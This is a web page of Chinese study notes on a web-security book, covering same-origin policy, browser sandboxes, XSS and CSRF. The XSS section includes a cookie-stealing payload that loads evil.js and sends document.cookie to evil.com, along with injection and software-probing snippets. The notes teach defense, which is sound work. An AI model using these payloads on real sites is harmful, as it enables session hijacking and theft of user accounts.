<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-alpha.62">
<title data-react-helmet="true">手稿 | DocsShare</title><meta data-react-helmet="true" name="docsearch:version" content="current"><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:title" content="手稿 | DocsShare"><meta data-react-helmet="true" name="description" content="作者：吴翰清"><meta data-react-helmet="true" property="og:description" content="作者：吴翰清"><meta data-react-helmet="true" property="og:url" content="https://leoooy.github.io//docs/Security/白帽子讲web安全/手稿"><link data-react-helmet="true" rel="shortcut icon" href="/img/leo.png"><link data-react-helmet="true" rel="canonical" href="https://leoooy.github.io//docs/Security/白帽子讲web安全/手稿"><link rel="stylesheet" href="/styles.fcc05d64.css">
<link rel="preload" href="/styles.da09b0aa.js" as="script">
<link rel="preload" href="/runtime~main.fcea67fc.js" as="script">
<link rel="preload" href="/main.2f1d5848.js" as="script">
<link rel="preload" href="/1.f45b894e.js" as="script">
<link rel="preload" href="/2.a477ba05.js" as="script">
<link rel="preload" href="/3.32e8b994.js" as="script">
<link rel="preload" href="/1be78505.89b8407a.js" as="script">
<link rel="preload" href="/171.d3ef19ea.js" as="script">
<link rel="preload" href="/935f2afb.43a6fc9a.js" as="script">
<link rel="preload" href="/17896441.30e2172e.js" as="script">
<link rel="preload" href="/e9dcd929.3fa2b100.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<nav class="navbar navbar--light navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><div aria-label="Navigation bar toggle" class="navbar__toggle" role="button" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></div><a class="navbar__brand" href="/"><img class="navbar__logo" src="/img/leo.png" alt="My Site Logo"><strong class="navbar__title">My DocsShare</strong></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs">Notes</a><a class="navbar__item navbar__link" href="/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/LeoooY" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub</a><a href="https://juejin.im/user/5bebc171e51d4511a8090edb/posts" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">掘金</a><a href="https://twitter.com/LeoY233" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Twitter</a><div class="react-toggle react-toggle--disabled displayOnlyInLargeViewport_2aTZ"><div class="react-toggle-track"><div class="react-toggle-track-check"><span class="toggle_BsTx">🌜</span></div><div class="react-toggle-track-x"><span class="toggle_BsTx">🌞</span></div></div><div class="react-toggle-thumb"></div><input type="checkbox" disabled="" aria-label="Dark mode toggle" class="react-toggle-screenreader-only"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div><div class="navbar-sidebar"><div class="navbar-sidebar__brand"><a class="navbar__brand" href="/"><img class="navbar__logo" src="/img/leo.png" alt="My Site Logo"><strong class="navbar__title">My DocsShare</strong></a></div><div class="navbar-sidebar__items"><div class="menu"><ul class="menu__list"><li class="menu__list-item"><a aria-current="page" class="menu__link navbar__link--active" href="/docs">Notes</a></li><li class="menu__list-item"><a class="menu__link" href="/blog">Blog</a></li><li class="menu__list-item"><a href="https://github.com/LeoooY" target="_blank" rel="noopener noreferrer" class="menu__link">GitHub</a></li><li class="menu__list-item"><a href="https://juejin.im/user/5bebc171e51d4511a8090edb/posts" target="_blank" rel="noopener noreferrer" class="menu__link">掘金</a></li><li class="menu__list-item"><a href="https://twitter.com/LeoY233" target="_blank" rel="noopener noreferrer" class="menu__link">Twitter</a></li></ul></div></div></div></nav><div class="main-wrapper"><div class="docPage_2gpo"><main class="docMainContainer_3EyW"><div class="container padding-vert--lg docItemWrapper_1EkI"><div class="row"><div class="col docItemCol_2ASc"><div class="docItemContainer_3QWW"><article><div><span class="badge badge--secondary">Version: Next</span></div><header><h1 class="docTitle_1Lrw">手稿</h1></header><div class="markdown"><p>作者：吴翰清</p><p>白帽、黑帽
黑帽子是指那些造成破坏的黑客，而白帽子则是研究安全，但不造成破坏的黑客。<strong>白帽子均以建设更安全的互联网为己任。</strong></p><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="一、安全世界观"></a>一、安全世界观<a aria-hidden="true" tabindex="-1" class="hash-link" href="#一、安全世界观" title="Direct link to heading">#</a></h2><h3><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="11-web-安全简史"></a>1.1 Web 安全简史<a aria-hidden="true" tabindex="-1" class="hash-link" href="#11-web-安全简史" title="Direct link to heading">#</a></h3><p>微软STRIDE模型
微软DREAD模型</p><p>白帽兵法：</p><ul><li>Secure By Default 原则<ul><li>黑名单、白名单</li><li>最小权限原则</li></ul></li><li>Defense in Depth 纵深防御原则（全环节防御）</li><li>数据与代码分离（Js从用户输入中）</li><li>不可预测原则（ASLR，DEP，CSRF的防御技术）</li></ul><blockquote><p>安全是一门朴素的学问,也是一种平衡的艺术。</p></blockquote><p>一个业务安全设计得好的网站,往往 loginID 和 nickname(昵称)是分开的。登录ID是用户的私有信息,只有用户本人能够看到;而 nickname 不能用于登录,但可以公开给所有人看。这种设计的细节,是网站积极防御的一种表现。</p><p>PHP0字节截断
永远也别指望让最终用户来买单
cgi.fix_pathinfo的问题仍然没有修改默认配置,使用fastcgi的PHP应
用默认处于风险中</p><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="二、客户端脚本安全"></a>二、客户端脚本安全<a aria-hidden="true" tabindex="-1" class="hash-link" href="#二、客户端脚本安全" title="Direct link to heading">#</a></h2><h3><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="2浏览器安全"></a>2浏览器安全<a aria-hidden="true" tabindex="-1" class="hash-link" href="#2浏览器安全" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="21同源策略（same-origin-policy）"></a>2.1同源策略（Same Origin Policy）<a aria-hidden="true" tabindex="-1" class="hash-link" href="#21同源策略（same-origin-policy）" title="Direct link to heading">#</a></h4><p><strong>浏览器同源策略，限制了来自不同源的document或者脚本对当前document的读取和操作</strong>
协议、域名、端口
加载js的域</p><div class="mdxCodeBlock_1XEh"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token plain">&lt;script&gt; &lt;img&gt; &lt;iframe&gt; &lt;link&gt; 不受同源限制</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></div><p>通过HTTP header来授权是否跨域请求</p><p>IE8 css跨域漏洞</p><h4><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="22-浏览器沙箱"></a>2.2 浏览器沙箱<a aria-hidden="true" tabindex="-1" class="hash-link" href="#22-浏览器沙箱" title="Direct link to heading">#</a></h4><p>浏览器的多进程架构沙盒
SandBox资源隔离类模块
Google Chrome实现了一个较完整的沙盒</p><h4><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="23-恶意网站拦截"></a>2.3 恶意网站拦截<a aria-hidden="true" tabindex="-1" class="hash-link" href="#23-恶意网站拦截" title="Direct link to heading">#</a></h4><p>挂马网站
钓鱼网站
恶意网址黑名单: PhishTank Google
EV SSL</p><h4><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="24-高速发展的浏览器安全"></a>2.4 高速发展的浏览器安全<a aria-hidden="true" tabindex="-1" class="hash-link" href="#24-高速发展的浏览器安全" title="Direct link to heading">#</a></h4><p>IE8中的XSS filter
Firefox中的CSP（Content securit Policy-Robert Hanson）Http头中描述安全策略</p><div class="mdxCodeBlock_1XEh"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token plain">X-Content-Security-Policy: allow &#x27;self&#x27; *.mydomain.com</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></div><p>浏览器插件： Trojan.PWS.ChromeInject.A(窃取网银密码)</p><h3><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="3-跨站脚本攻击-xss"></a>3 跨站脚本攻击 XSS<a aria-hidden="true" tabindex="-1" class="hash-link" href="#3-跨站脚本攻击-xss" title="Direct link to heading">#</a></h3><p>破坏力大，场景复杂</p><ul><li>反射型XSS(将用户输入反射给浏览器)</li><li>存储型XSS(钓鱼网站将用户输入存储到服务器端)</li><li>DOM based XSS（其实也是反射型XSS，修改DOM节点形成的XSS）</li></ul><p>XSS payload</p><blockquote><p>XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些植入的以完成各种具体功能的恶意脚本，被陈为“XSS payload”</p></blockquote><p>一个最常见的XSS payload就是通过读取浏览器的Cookie对象，从而发起Cookie劫持。</p><div class="mdxCodeBlock_1XEh"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token plain"># 攻击者先设法加载一个远程脚本</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">&lt;script src=&quot;http://www.evil.com/evil.js&quot;&gt;&lt;/script&gt;</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># 在evil.js中可以通过如下代码窃取cookie</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">const img=document.createElement(&#x27;img&#x27;)</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">img.src=&quot;http://www.evil.com/log?&quot;+escape(document.cookie)</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">document.body.appendChild(img)</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># 这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">作为参数发送到了远程服务器上</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># 甚至/log这个接口都不需要存在，因为这个请求会在远程服务器的日志中留下记录</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">...... GET /log?cookiexxxxxxxx HTTP/1.1 404 ........</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># 这样就完成了一个最简单的窃取cookie的XSS payload</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># cookie的“HttpOnly”标识可以防止“Cookie劫持”</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></div><p>构造GET与POST请求</p><ul><li>form表单</li><li>XMLHttpRequest</li><li>JS</li></ul><p>XSS钓鱼</p><ul><li>验证码</li><li>修改密码</li><li>识别用户浏览器 userAgent，浏览器功能实现差异判断（更准确，可识别版本）</li><li>检测用户安装的软件<code>ActiveX</code>控件</li></ul><div class="mdxCodeBlock_1XEh"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token plain">try{</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    const XL=new ActiveXObject(&#x27;XunleiBHO.ThunderHelper&#x27;)</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">}catch{</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    // 用户没有安装此软件    </span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">}</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># Flash有个system.capabilities可以查询客户端电脑的硬件信息</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># 浏览器的扩展和插件也能够被XSS payload识别出来</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># 比如Firefox的插件(plugins)存放在一个DOM对象中，通过查询DOM可以遍历出所有的插件</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># navigtion.plugin</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># Firefox扩展(Extension)的扫描，通过chrome://协议可以检测扩展的图标是否存在来判断是否安装扩展</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></div><ul><li>Css History Hack 利用css的visited属性,用户访问过的链接颜色不一样。Firefox在2010年3月修复了此问题。</li><li>获取用户真实ip</li></ul><div class="mdxCodeBlock_1XEh"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token plain">JS本身没有提供获取本地IP的能力。一般来说XSS攻击者需要借助第三方软件来完成。</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">比如如果用户安装了Java环境(JRE)，那么XSS就可以通过调研Java Applet的接口来获取客户端的本地IP地址。</span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"># 在XSS攻击框架“Attch API”</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></div><p>XSS 攻击平台</p><ul><li>Attack API</li><li>BeEF</li><li>XSS-Proxy</li></ul><p>终极武器<code>XSS-Worm</code></p><ul><li>Samy Worm</li></ul><div class="mdxCodeBlock_1XEh"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token plain">&lt;div style=&quot;background:url(&#x27;javascript:alert(1)&#x27;)&quot;&gt;</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></div><ul><li>百度空间蠕虫</li></ul><p>调试JavaScript</p><ul><li>FireBug</li><li>chrome dev tools</li><li>fildder 手机抓包/本地抓包</li></ul><p>XSS构造技巧</p><ul><li>字符串编码</li><li>绕过长度限制(事件，注释符)</li><li>藏代码 location.hash</li><li><code>&lt;base&gt;</code>标签</li><li><code>window.name</code></li></ul><p>3.3 XSS的防御</p><ul><li>HttpOnly</li><li>输入检查</li><li>输出检查</li><li>处理富文本</li><li>防御DOM based XSS</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="4-跨站点请求伪造（csrf）"></a>4 跨站点请求伪造（CSRF）<a aria-hidden="true" tabindex="-1" class="hash-link" href="#4-跨站点请求伪造（csrf）" title="Direct link to heading">#</a></h3><p>4.1 CSRF简介</p><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="服务器端应用安全"></a>服务器端应用安全<a aria-hidden="true" tabindex="-1" class="hash-link" href="#服务器端应用安全" title="Direct link to heading">#</a></h2><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2cZh" id="互联网公司安全运营"></a>互联网公司安全运营<a aria-hidden="true" tabindex="-1" class="hash-link" href="#互联网公司安全运营" title="Direct link to heading">#</a></h2></div></article><div class="margin-vert--lg"><nav class="pagination-nav" aria-label="Blog list page navigation"><div class="pagination-nav__item"></div><div class="pagination-nav__item pagination-nav__item--next"></div></nav></div></div></div><div class="col col--3"><div class="tableOfContents_3SO_"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#一、安全世界观" class="table-of-contents__link">一、安全世界观</a><ul><li><a href="#11-web-安全简史" class="table-of-contents__link">1.1 Web 安全简史</a></li></ul></li><li><a href="#二、客户端脚本安全" class="table-of-contents__link">二、客户端脚本安全</a><ul><li><a href="#2浏览器安全" class="table-of-contents__link">2浏览器安全</a></li><li><a href="#3-跨站脚本攻击-xss" class="table-of-contents__link">3 跨站脚本攻击 XSS</a></li><li><a href="#4-跨站点请求伪造（csrf）" class="table-of-contents__link">4 跨站点请求伪造（CSRF）</a></li></ul></li><li><a href="#服务器端应用安全" class="table-of-contents__link">服务器端应用安全</a></li><li><a href="#互联网公司安全运营" class="table-of-contents__link">互联网公司安全运营</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container"><div class="text--center"><div>Copyright © 2020 LeoY233. Built with Docusaurus.</div></div></div></footer></div>
<script src="/styles.da09b0aa.js"></script>
<script src="/runtime~main.fcea67fc.js"></script>
<script src="/main.2f1d5848.js"></script>
<script src="/1.f45b894e.js"></script>
<script src="/2.a477ba05.js"></script>
<script src="/3.32e8b994.js"></script>
<script src="/1be78505.89b8407a.js"></script>
<script src="/171.d3ef19ea.js"></script>
<script src="/935f2afb.43a6fc9a.js"></script>
<script src="/17896441.30e2172e.js"></script>
<script src="/e9dcd929.3fa2b100.js"></script>
</body>
</html>